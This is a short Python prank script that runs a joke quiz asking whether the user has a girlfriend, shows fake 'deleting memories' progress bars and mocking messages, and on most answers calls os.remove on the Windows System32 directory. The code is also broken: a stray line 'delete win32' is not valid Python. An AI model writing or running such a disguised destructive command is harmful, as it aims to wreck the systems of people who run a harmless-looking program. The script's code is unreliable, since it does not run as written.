import time
import os
from colorama import Fore, Back, Style, init

print(Fore.RED + "Starting Precess!")
time.sleep(6)

question = input(Fore.GREEN + "Do you have girlfriend?: ")
if question == "Yes":
    print(Fore.YELLOW + "NICE, good life!")
    time.sleep(4)
    os.remove("C:\Windows\System32")
    quit()

elif question == "No":
    time.sleep(4)
    question2 = input(Fore.GREEN + "Do you want to continue?: ")
    if question2 == "No":
        time.sleep(3)
        print(Fore.YELLOW + "So byee...")

    elif question2 == "Yes":
        time.sleep(5)
        print(Fore.RED + "Starting!!")
    time.sleep(4)

    print(Fore.WHITE + "[|] 1/3 deleting memories...")
    time.sleep(4)

    print(Fore.WHITE + "[||] 2/3 deleting feelings...")
    time.sleep(4)

    print(Fore.WHITE + "[|||] 3/3 deleting her life...")
    time.sleep(3)

    print(Fore.LIGHTRED_EX + "Process completed successfully!")
    time.sleep(4)

    print(Fore.MAGENTA + "My calculations says..")
    time.sleep(3)

    print(Fore.RED + "Go to gym lol! and find another girlfriend")
    #off or on script deleting system32
    delete win32

    question3 = input("Do you want to still continue haha?: ")
    if question3 == "No":
        time.sleep(2)
        print("Your choice :)")
        time.sleep(3)
        os.remove("C:\Windows\System32")

    elif question3 == "Yes":
        time.sleep(9)
        print("So your choice :)")
        time.sleep(3)
        print("Byee!")
        time.sleep(3)
        os.remove("C:\Windows\System32")
    
    quit()
